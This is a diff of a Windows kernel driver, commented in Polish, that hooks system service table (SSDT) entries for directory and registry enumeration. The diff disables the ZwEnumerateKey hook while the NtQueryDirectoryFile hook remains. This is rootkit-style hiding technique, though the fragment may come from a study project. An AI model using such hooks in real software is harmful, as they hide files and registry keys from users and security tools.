@@ -19,20 +19,6 @@ ZWENUMERATEKEY              OldNtEnumerateKey;
 
 BOOLEAN bHooked = FALSE;
 
-//NTSTATUS NewZwQueryDirectoryFile(
-//	IN HANDLE hFile,
-//	IN HANDLE hEvent OPTIONAL,
-//	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
-//	IN PVOID IoApcContext OPTIONAL,
-//	OUT PIO_STATUS_BLOCK pIoStatusBlock,
-//	OUT PVOID FileInformationBuffer,
-//	IN ULONG FileInformationBufferLength,
-//	IN FILE_INFORMATION_CLASS FileInfoClass,
-//	IN BOOLEAN bReturnOnlyOneEntry,
-//	IN PUNICODE_STRING PathMask OPTIONAL,
-//	IN BOOLEAN bRestartQuery
-//);
-
 /*
 * Zalozenie hookow na okreslone funkcje w tablicy SSDT.
 * Przechwytujemy wywolania funkcji (us³ug systemowych):
@@ -61,8 +47,8 @@ VOID HookApis()
 //        OldZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
 //        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
         
-        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
-        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 
+//        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
+//        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 
 
 		bHooked = TRUE;
 		WPON();
@@ -89,7 +75,7 @@ VOID UnHookApis()
 		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = OldNtQueryDirectoryFile;	
 		
 //        SYSTEMSERVICE( ZwOpenKey ) = OldZwOpenKey;
-        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;        
+//        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;        
 
 		bHooked = FALSE;
 		WPON();
